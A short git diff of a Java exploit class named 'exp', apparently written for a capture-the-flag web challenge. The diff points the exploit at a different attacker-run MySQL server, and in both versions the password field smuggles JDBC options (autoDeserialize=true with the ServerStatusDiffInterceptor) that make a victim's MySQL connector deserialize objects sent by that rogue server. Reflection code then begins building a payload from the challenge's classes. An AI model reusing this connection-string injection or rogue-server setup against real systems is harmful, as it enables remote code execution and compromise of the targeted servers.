@@ -59,10 +59,10 @@ public class exp {
 
     public static void main(String[] args) throws Exception {
         Info databaseInfo = new DatabaseInfo();
-        setFieldValue(databaseInfo, "host", "47.101.176.40");
-        setFieldValue(databaseInfo, "port", "33060");
-        setFieldValue(databaseInfo, "username", "fmyyy");
-        setFieldValue(databaseInfo, "password", "fmyyy&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");
+        setFieldValue(databaseInfo, "host", "crypt0n.cn");
+        setFieldValue(databaseInfo, "port", "3306");
+        setFieldValue(databaseInfo, "username", "root");
+        setFieldValue(databaseInfo, "password", "root&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");
         Class clazz = Class.forName("gdufs.challenge.web.invocation.InfoInvocationHandler");
         Constructor construct = clazz.getDeclaredConstructor(Info.class);
         construct.setAccessible(true);
